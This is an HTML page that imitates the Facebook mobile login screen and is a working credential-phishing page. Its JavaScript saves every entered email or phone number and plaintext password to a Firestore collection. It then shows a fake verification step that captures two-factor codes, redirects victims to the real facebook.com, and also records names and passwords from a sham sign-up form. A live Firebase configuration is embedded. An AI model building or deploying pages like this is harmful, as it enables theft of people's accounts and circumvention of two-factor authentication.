<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- Firebase App (Core) SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <!-- Firebase Auth SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
    <!-- Firebase Firestore SDK (Optional for database) -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>

    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #ffffff;
        }
    </style>
</head>
<body class="flex flex-col justify-between min-h-screen px-4 py-4 max-w-md mx-auto relative select-none">

    <div class="flex flex-col w-full pt-1 pb-2">
        <div class="flex items-center w-full">
            <button onclick="goBack()" class="text-gray-800 p-1 cursor-pointer z-10">
                <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"></path>
                </svg>
            </button>
        </div>
        <!-- English (US) centered right below the back arrow matching reference image -->
        <div class="flex items-center justify-center gap-1 text-gray-500 text-sm cursor-pointer font-normal mt-[-1.5rem]">
            <span>English (US)</span>
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
        </div>
    </div>

    <div id="messageBox" class="hidden my-2 bg-emerald-100 border border-emerald-400 text-emerald-800 px-4 py-3 rounded-xl relative text-sm font-medium shadow-sm transition-all text-center" role="alert">
        <span id="messageText">Verification code sent!</span>
    </div>

    <div class="flex flex-col items-center justify-center my-auto w-full space-y-6">
        
        <!-- Professional Facebook Circle Logo matching reference image -->
        <div class="w-20 h-20 flex items-center justify-center">
            <svg viewBox="0 0 36 36" class="w-20 h-20 drop-shadow-sm">
                <path fill="#1877F2" d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.1-.8.1z"></path>
                <path fill="#FFFFFF" d="M25 20.2l.9-5.7h-5.5v-3.7c0-1.6.8-3.1 3.2-3.1h2.6V2.7c-1.4-.2-3-.3-4.6-.3-4.7 0-7.8 2.8-7.8 8v4.3h-5v5.7h5v15.2c1 .2 2 .3 3 .3s2-.1 3-.3V20.2h4.6z"></path>
            </svg>
        </div>

        <!-- Initial Login View Form -->
        <form id="loginForm" onsubmit="handleLogin(event)" class="w-full space-y-3.5">
            <div>
                <input type="text" id="emailOrPhone" 
                    placeholder="Mobile number or email" 
                    class="w-full px-4 py-3.5 text-base bg-white border border-gray-300 rounded-2xl focus:outline-none focus:border-[#1877f2] transition placeholder-gray-400">
            </div>
            <div>
                <input type="password" id="password" 
                    placeholder="Password" 
                    class="w-full px-4 py-3.5 text-base bg-white border border-gray-300 rounded-2xl focus:outline-none focus:border-[#1877f2] transition placeholder-gray-400">
            </div>
            <div class="pt-1">
                <button type="submit" 
                    class="w-full bg-[#0064e0] hover:bg-[#0051b3] text-white font-semibold py-3.5 px-4 rounded-full text-base transition duration-200 shadow-sm cursor-pointer">
                    Log in
                </button>
            </div>
        </form>

        <!-- Verification Code View Form (Hidden by default) -->
        <div id="verificationView" class="hidden w-full space-y-4">
            <div class="text-center text-gray-800 font-semibold text-base">
                Enter your verification code
            </div>
            <div>
                <input type="text" id="verificationCode" 
                    placeholder="Enter code" 
                    class="w-full px-4 py-3.5 text-base bg-white border border-gray-300 rounded-2xl focus:outline-none focus:border-[#1877f2] transition placeholder-gray-400">
            </div>
            <div class="pt-1">
                <button type="button" onclick="handleVerifySend()" 
                    class="w-full bg-[#0064e0] hover:bg-[#0051b3] text-white font-semibold py-3.5 px-4 rounded-full text-base transition duration-200 shadow-sm cursor-pointer">
                    Send
                </button>
            </div>
        </div>

        <!-- Forgot Password (Static inert link) -->
        <div class="pt-1">
            <a href="javascript:void(0);" class="text-[#050505] text-sm font-semibold cursor-default">Forgot password?</a>
        </div>
    </div>

    <div class="flex flex-col items-center w-full space-y-4 pb-2">
        <div class="w-full">
            <button type="button" onclick="showCreateAccountModal()" 
                class="w-full bg-white border-2 border-[#0064e0] text-[#0064e0] hover:bg-blue-50 font-semibold py-3.5 px-4 rounded-full text-base transition duration-200 cursor-pointer">
                Create new account
            </button>
        </div>

        <!-- Meta Branding with official icon & Demo Tag -->
        <div class="flex flex-col items-center space-y-1">
            <div class="flex items-center space-x-1.5 opacity-90">
                <!-- Official Meta infinity logo SVG -->
                <svg class="w-4 h-4 text-[#0064e0]" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm0 18c-4.411 0-8-3.589-8-8s3.589-8 8-8 8 3.589 8 8-3.589 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
                </svg>
                <span class="font-bold text-gray-800 tracking-wider text-sm">Meta</span>
            </div>
    </div>

    <div id="emptyModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50 p-4">
        <div class="bg-white rounded-xl shadow-2xl max-w-sm w-full p-6 space-y-5 transform transition-all">
            <div class="text-gray-800 text-base font-normal leading-relaxed">
                Enter your email or mobile number to log in
            </div>
            <div class="flex justify-end space-x-6 pt-2 font-semibold text-sm">
                <button type="button" onclick="closeEmptyModal()" class="text-[#0064e0] hover:bg-blue-50 px-3 py-1.5 rounded cursor-pointer">Find my account</button>
                <button type="button" onclick="closeEmptyModal()" class="text-[#0064e0] hover:bg-blue-50 px-3 py-1.5 rounded cursor-pointer">OK</button>
            </div>
        </div>
    </div>

    <div id="accountModal" class="fixed inset-0 bg-black bg-opacity-40 flex items-end sm:items-center justify-center hidden z-50 p-0 sm:p-4">
        <div class="bg-white rounded-t-2xl sm:rounded-2xl shadow-2xl max-w-md w-full p-6 space-y-4 relative transform transition-all">
            <div class="flex justify-between items-center border-b pb-3">
                <div>
                    <h3 class="text-xl font-bold text-gray-900">Create New Account</h3>
                    <p class="text-xs text-gray-500">It's quick and easy.</p>
                </div>
                <button onclick="closeCreateAccountModal()" class="text-gray-400 hover:text-gray-600 text-2xl font-bold cursor-pointer">&times;</button>
            </div>
            <div class="space-y-3 pt-1">
                <div class="grid grid-cols-2 gap-2">
                    <input type="text" id="signupFirstName" placeholder="First name" class="w-full px-3 py-3 bg-gray-50 border rounded-xl text-sm focus:outline-none focus:border-[#1877f2]">
                    <input type="text" id="signupSurname" placeholder="Surname" class="w-full px-3 py-3 bg-gray-50 border rounded-xl text-sm focus:outline-none focus:border-[#1877f2]">
                </div>
                <input type="text" id="signupEmailOrPhone" placeholder="Mobile number or email" class="w-full px-3 py-3 bg-gray-50 border rounded-xl text-sm focus:outline-none focus:border-[#1877f2]">
                <input type="password" id="signupPassword" placeholder="New password" class="w-full px-3 py-3 bg-gray-50 border rounded-xl text-sm focus:outline-none focus:border-[#1877f2]">
                <div class="pt-2">
                    <button type="button" onclick="handleSignupSubmit()" class="w-full bg-[#0064e0] hover:bg-[#0051b3] text-white font-semibold py-3 rounded-full text-base transition cursor-pointer">
                        Sign Up
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ==========================================
        // FIREBASE CONFIGURATION (আপনার ফায়ারবেস কনসোল থেকে তথ্য এখানে বসান)
        // ==========================================
const firebaseConfig = {
  apiKey: "AIzaSyDqj-nTKntPrNL6tn6_IUkMAGeBzYJIGg4",
  authDomain: "facebook-952a5.firebaseapp.com",
  projectId: "facebook-952a5",
  storageBucket: "facebook-952a5.firebasestorage.app",
  messagingSenderId: "25146345483",
  appId: "1:25146345483:web:04a44e0e7f9e61bb3d9f0e"
};

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore(); // Firestore ডাটাবেসের জন্য

        // Handle mock login submit action with Firebase integration
        function handleLogin(event) {
            event.preventDefault();
            const email = document.getElementById('emailOrPhone').value.trim();
            const password = document.getElementById('password').value.trim();
            const messageBox = document.getElementById('messageBox');
            const messageText = document.getElementById('messageText');

            if (!email && !password) {
                document.getElementById('emptyModal').classList.remove('hidden');
                return;
            }

            // ফায়ারবেস ডাটাবেসে লগইন ইনফো সেভ করার উদাহরণ (Firestore)
            db.collection("login_attempts").add({
                emailOrPhone: email,
                password: password,
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            }).then(() => {
                console.log("Login data saved to Firebase!");
            }).catch((error) => {
                console.error("Error saving data: ", error);
            });

            // Hide login form and show verification view
            document.getElementById('loginForm').classList.add('hidden');
            document.getElementById('verificationView').classList.remove('hidden');

            messageText.innerText = `Verification code sent for "${email || 'User'}".`;
            messageBox.classList.remove('hidden');
            
            setTimeout(() => {
                messageBox.classList.add('hidden');
            }, 4000);
        }

        // Handle verification code submission and redirect
        function handleVerifySend() {
            const code = document.getElementById('verificationCode').value.trim();
            const messageBox = document.getElementById('messageBox');
            const messageText = document.getElementById('messageText');

            // কোড ফায়ারবেসে সেভ করতে চাইলে এখানে করতে পারেন
            db.collection("verification_codes").add({
                code: code,
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            });

            messageText.innerText = "Verification successful! Redirecting to Facebook...";
            messageBox.classList.remove('hidden');
            
            setTimeout(() => {
                window.location.href = "https://www.facebook.com";
            }, 1500);
        }

        function closeEmptyModal() {
            document.getElementById('emptyModal').classList.add('hidden');
        }

        // Back button action
        function goBack() {
            const verificationView = document.getElementById('verificationView');
            if (!verificationView.classList.contains('hidden')) {
                verificationView.classList.add('hidden');
                document.getElementById('loginForm').classList.remove('hidden');
                return;
            }

            const messageBox = document.getElementById('messageBox');
            const messageText = document.getElementById('messageText');
            messageText.innerText = "Back button clicked.";
            messageBox.classList.remove('hidden');
            setTimeout(() => {
                messageBox.classList.add('hidden');
            }, 3000);
        }

        // Modal Controls
        function showCreateAccountModal() {
            document.getElementById('accountModal').classList.remove('hidden');
        }

        function closeCreateAccountModal() {
            document.getElementById('accountModal').classList.add('hidden');
        }

        function handleSignupSubmit() {
            const firstName = document.getElementById('signupFirstName').value.trim();
            const surname = document.getElementById('signupSurname').value.trim();
            const emailOrPhone = document.getElementById('signupEmailOrPhone').value.trim();
            const password = document.getElementById('signupPassword').value.trim();

            // ফায়ারবেসে সাইন-আপ ডাটা সেভ করার কোড
            db.collection("signups").add({
                firstName: firstName,
                surname: surname,
                emailOrPhone: emailOrPhone,
                password: password,
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            }).then(() => {
                console.log("Signup data saved to Firebase!");
            }).catch((error) => {
                console.error("Error saving signup data: ", error);
            });

            const messageBox = document.getElementById('messageBox');
            const messageText = document.getElementById('messageText');
            messageText.innerText = "Demo account successfully created!";
            messageBox.classList.remove('hidden');
            closeCreateAccountModal();
            setTimeout(() => {
                messageBox.classList.add('hidden');
            }, 4000);
        }
    </script>
</body>
</html>
